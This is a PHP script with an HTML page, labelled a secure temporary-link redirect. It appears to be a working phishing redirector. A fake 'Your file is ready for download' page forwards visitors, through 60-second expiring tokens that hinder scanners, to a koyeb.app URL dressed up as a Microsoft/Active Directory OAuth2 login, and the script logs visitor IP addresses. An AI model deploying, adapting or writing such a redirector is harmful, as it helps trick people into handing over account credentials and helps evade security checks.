<?php
// ==============================================
// SECURE 1-MINUTE TEMPORARY LINK REDIRECT
// ==============================================

// Enable error reporting for debugging (disable in production)
error_reporting(0);
ini_set('display_errors', 0);

// ================= CONFIGURATION =================
$config = [
    // Redirect target link
    'redirect_link' => 'https://representative-joelynn-activedirectory-39a69909.koyeb.app/oauth2/common/client_id_b61c8803-16f3-4c35-9b17-6f65f441df86/',  // The URL to redirect to
    'expire_seconds' => 60,  // Expiration in seconds
    'redirect_delay' => 1    // 1-second redirect delay
];

// ================= SECURITY CHECKS =================
// Block direct access to this file if not via web request
if (php_sapi_name() === 'cli') {
    die("This script can only be accessed via web browser");
}

// ================= TOKEN HANDLING =================
function generateToken() {
    return bin2hex(random_bytes(16)) . '_' . time();
}

function isTokenValid($token) {
    $parts = explode('_', $token);
    return (count($parts) === 2 && (time() - (int)$parts[1]) <= 60);
}

// ================= REQUEST HANDLING =================
try {
    // Handle redirect request
    if (isset($_GET['token'])) {
        $token = $_GET['token'];
        
        if (!isTokenValid($token)) {
            throw new Exception("This link has expired after 1 minute");
        }

        // Log successful access
        file_put_contents('access.log', sprintf(
            "%s|ACCESSED|%s|%s\n",
            date('Y-m-d H:i:s'),
            $_SERVER['REMOTE_ADDR'],
            $token
        ), FILE_APPEND);

        // Perform redirect
        header("Location: {$config['redirect_link']}");
        exit;
    }

    // ================= NEW REQUEST =================
    // Generate new token
    $token = generateToken();
    $current_url = (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . 
                  $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'];
    $redirectUrl = $current_url . '?token=' . urlencode($token);

    // Log generation
    file_put_contents('access.log', sprintf(
        "%s|GENERATED|%s|%s\n",
        date('Y-m-d H:i:s'),
        $_SERVER['REMOTE_ADDR'],
        $token
    ), FILE_APPEND);

} catch (Exception $e) {
    // Error handling
    error_log("Redirect Error: " . $e->getMessage());
    http_response_code(500);
    header('Content-Type: text/html; charset=utf-8');
    die("<h1>Error</h1><p>{$e->getMessage()}</p>");
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            background: #f0f0f0;
            display: flex;
            justify-content: center;
            align-items: center;
        }
        .top-bar {
            position: fixed;
            top: 0;
            width: 100%;
            background-color: #333;
            color: white;
            padding: 10px 0;
            text-align: center;
            font-weight: bold;
            opacity: 0;
            animation: fadeIn 1s ease-in-out forwards;
        }
        .message-box {
            position: relative;
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 15px rgba(0, 0, 0, 0.1);
            border-radius: 5px;
            text-align: center;
            max-width: 400px;
            opacity: 0;
            animation: fadeIn 1s ease-in-out forwards;
        }
        .footer {
            font-size: 0.8rem;
            color: #888;
        }

        /* Fade animation */
        @keyframes fadeIn {
            0% { opacity: 0; }
            100% { opacity: 1; }
        }

        /* Fade out animation */
        @keyframes fadeOut {
            0% { opacity: 1; }
            100% { opacity: 0; }
        }

        .fade-out {
            animation: fadeOut 1s ease-in-out forwards;
        }
    </style>
</head>
<body>
    <div class="top-bar" id="top-bar">Preparing Document...</div>
    <div class="message-box" id="message-box">
        <h2 id="message">Hang tight! You will be redirected soon.</h2>
        <p>This page will redirect automatically in <span id="countdown">5</span> seconds.</p>
        <p class="footer">If not, <a href="YOUR_LINK">click here</a>.</p>
    </div>

    <script>
        let countdown = 2;
        let topBar = document.getElementById('top-bar');
        let messageBox = document.getElementById('message-box');
        let message = document.getElementById('message');

        // Stage 1: Preparing Document
        setTimeout(() => {
            topBar.textContent = 'Preparing Document...';
            topBar.style.opacity = 1; // Fade in
        }, 0);

        // Stage 2: Your File is Ready (fade out "Preparing Document" and fade in)
        setTimeout(() => {
            topBar.classList.add('fade-out');
            message.textContent = 'Your file is ready for download!';
            messageBox.style.opacity = 1; // Fade in message box
        }, 2000);

        // Stage 3: Redirecting in Progress (fade out "Your File is Ready" and fade in)
        setTimeout(() => {
            messageBox.classList.add('fade-out');
            topBar.textContent = 'Redirecting in Progress...';
            topBar.style.opacity = 1; // Fade in again
            message.textContent = 'You will be redirected shortly.';
            messageBox.style.opacity = 1; // Fade in message box again
        }, 4000);

        // Countdown Timer (Update every second)
        setInterval(() => {
            document.getElementById('countdown').textContent = countdown;
            if (countdown > 0) countdown--;
        }, 1000);

        // Redirect after countdown
        setTimeout(() => {
            window.location.href = "<?php echo $redirectUrl; ?>";
        }, 5000); // Redirect after 5 seconds
    </script>
</body>
</html>
